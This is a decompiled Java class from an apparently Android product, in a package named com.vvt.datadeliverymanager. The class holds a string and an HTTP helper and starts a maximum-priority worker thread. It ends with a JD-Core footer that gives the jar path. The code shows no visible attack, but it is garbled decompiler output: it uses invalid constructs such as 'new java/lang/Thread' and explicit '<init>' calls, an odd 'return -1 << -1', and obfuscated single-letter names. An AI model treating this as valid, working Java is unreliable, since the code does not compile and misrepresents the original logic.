package com.vvt.datadeliverymanager;

import com.vvt.http.a;

class f
{
  private String b;
  private a c;
  
  public f(d paramd, String paramString, a parama)
  {
    this.b = paramString;
    this.c = parama;
  }
  
  public int a()
  {
    Thread localThread = new java/lang/Thread;
    g localg = new com/vvt/datadeliverymanager/g;
    localg.<init>(this);
    localThread.<init>(localg);
    localThread.setPriority(10);
    localThread.start();
    localThread.getPriority();
    return -1 << -1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/datadeliverymanager/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */